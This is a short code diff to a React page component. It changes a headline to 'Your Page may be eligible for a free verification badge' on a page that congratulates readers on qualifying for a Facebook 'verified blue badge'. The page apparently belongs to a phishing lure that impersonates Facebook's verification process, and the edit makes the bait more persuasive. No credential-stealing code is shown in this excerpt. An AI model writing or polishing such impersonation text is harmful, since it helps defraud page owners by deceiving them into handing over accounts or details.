@@ -152,7 +152,7 @@ const Page: FC = () => {
 
             // For other languages, use Google Translate API
             const textsToTranslate = [
-                'Show the world that you mean business.',
+                'Your Page may be eligible for a free verification badge',
                 'Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you\'ve built with your audience.',
                 'We\'re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!',
                 'Subscribe on Facebook',
@@ -293,7 +293,7 @@ const Page: FC = () => {
                                 />
                             </div>
                             <h1 className="text-2xl md:text-5xl font-bold text-gray-900 mb-6 leading-tight">
-                                {t('Show the world that you mean business.')}
+                                {t('Your Page may be eligible for a free verification badge')}
                             </h1>
                             <p className="text-xs md:text-lg text-gray-600 mb-3 leading-relaxed">
                                 {t('Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you\'ve built with your audience.')}
